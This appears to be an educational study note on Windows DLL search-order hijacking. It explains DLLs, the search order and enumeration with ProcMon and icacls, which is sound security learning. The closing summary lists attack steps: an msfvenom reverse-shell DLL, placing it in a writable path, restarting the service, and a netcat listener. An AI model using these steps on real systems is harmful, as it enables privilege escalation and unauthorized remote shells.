# DLL Hijacking — Theory

> [!NOTE]
> This note covers the **concept and mechanics** of DLL Search Order Hijacking. See [[6. LAB - Service Abuse - DLL Hijacking]] for the practical walkthrough.

---

## What Are DLLs?

- **Dynamic Link Libraries** — shared code modules used by multiple applications
- Similar to Linux shared objects (`.so`) or Python imports (`import socket`, `import flask`)
- A single DLL (graphics, audio, networking) can be shared across many apps and services
- Makes code modular — reuse pre-written functions instead of writing from scratch

---

## The Vulnerability

When a service executable loads a DLL:
1. If the DLL path is **not hardcoded** in the application
2. Windows follows a **DLL Search Order** to locate it
3. If the DLL is **missing** from the expected location
4. And an attacker has **write access** to a directory in the search chain

→ The attacker places a malicious DLL with the expected filename in that writable directory
→ When the service starts, Windows loads the attacker's DLL under the service's privileged context

---

## DLL Hijacking Methods

| Method | Description |
|--------|-------------|
| **DLL Replacement** | Replace an existing legitimate DLL with a malicious one |
| **DLL Search Order Hijacking** | Place a malicious DLL in a higher-priority search location (**our focus**) |
| **DLL Redirection** | Redirect execution from a legitimate DLL to a malicious one |

---

## Windows DLL Search Order

When an application tries to load a DLL, Windows searches in this order:

| Priority | Location | Attacker Can Control? |
|----------|----------|-----------------------|
| 1 | DLLs already **loaded in memory** | ❌ |
| 2 | **Known DLLs** (pre-configured by OS) | ❌ |
| 3 | **Application's directory** | ⚠️ Possible |
| 4 | System directory: `C:\Windows\System32\` | ❌ |
| 5 | 16-bit system directory: `C:\Windows\System\` | ❌ |
| 6 | Windows directory: `C:\Windows\` | ❌ |
| 7 | **Current directory** | ⚠️ Possible |
| 8 | Directories in **`%PATH%`** | ⚠️ Possible |

> **Memory trick:** `Loaded → Known → Application → System32 → System → Windows → Current → PATH`

The search **stops immediately** when the DLL is found. If the application uses a custom search order that queries user-writable directories (like `C:\Temp`, `AppData`, user home) — the DLL can be hijacked.

## Enumeration with Process Monitor (ProcMon)

**ProcMon** (Sysinternals) captures all system events in real-time. To find DLL hijacking opportunities:

1. **Filter by Process Name:** `Process Name is <service_executable>.exe` → Include
2. **Filter by Result:** `Result is NAME NOT FOUND` → Include

This isolates instances where the application tried to load a DLL from a path where it **doesn't exist**.

![](attachments/Pasted%20image%2020260924194037.png)

Then check permissions on the directory where the missing DLL was searched:

```cmd
icacls <directory>
accesschk.exe -accepteula -dqv <directory>
```

---

## Exploitation Steps (Summary)

```
1. Identify missing DLL         → ProcMon (NAME NOT FOUND filter)
2. Check directory permissions  → icacls / accesschk
3. Generate malicious DLL       → msfvenom -p windows/shell_reverse_tcp -f dll
4. Place DLL in writable path   → copy reverse.dll <writable_dll_path>
5. Restart the service          → sc stop <service> & sc start <service>
6. Catch the shell              → nc -lvnp <port>
```

> [!TIP]
> DLL Hijacking operates on the **same path resolution concept** as Unquoted Service Paths — both abuse Windows' search order to execute attacker-controlled binaries under elevated service accounts.
